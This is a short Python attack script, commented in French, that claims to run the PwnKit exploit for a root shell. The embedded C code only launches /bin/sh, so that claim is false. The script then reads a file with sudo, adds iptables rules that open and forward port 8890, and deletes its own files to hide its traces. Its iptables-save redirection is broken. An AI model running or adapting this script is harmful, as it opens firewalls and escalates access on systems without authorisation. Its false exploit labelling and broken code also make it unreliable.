import os
import subprocess
import socket

# Code de l'exploit PwnKit
exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *args[] = { "/bin/sh", NULL };
    execv("/bin/sh", args);
    return 0;
}
"""

# Sauvegarde du code C dans un fichier temporaire
exploit_file_path = "/tmp/kit.c"
with open(exploit_file_path, 'w') as f:
    f.write(exploit_code)

# Compilation du code C en un exécutable
subprocess.run(["gcc", exploit_file_path, "-o", "/tmp/kit"])

# Définition des permissions pour rendre le fichier exécutable
os.chmod("/tmp/kit", 0o755)

# Exécution de l'exploit pour obtenir un shell root
subprocess.run(["/tmp/kit"])

# sesame
subprocess.run(["sudo", "cat", "./file.txt"])

# Récupérer l'adresse IP de l'hôte
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

# Configurer la redirection de port pour le port 8890
subprocess.run(["sudo", "iptables", "-A", "PREROUTING", "-t", "nat", "-i", "eth0", "-p", "tcp", "--dport", "8890", "-j", "DNAT", "--to-destination", f"{ip_address}:8890"])
subprocess.run(["sudo", "iptables", "-A", "INPUT", "-p", "tcp", "--dport", "8890", "-j", "ACCEPT"])
subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-p", "tcp", "-d", ip_address, "--dport", "8890", "-j", "ACCEPT"])
subprocess.run(["sudo", "iptables-save", ">", "/etc/iptables/rules.v4"])

# Afficher l'adresse IP
print(f"L'adresse IP de l'hôte est : {ip_address}")

# Nettoyage du code source et du binaire pour des raisons de sécurité
os.remove("/tmp/kit.c")
os.remove("/tmp/kit")
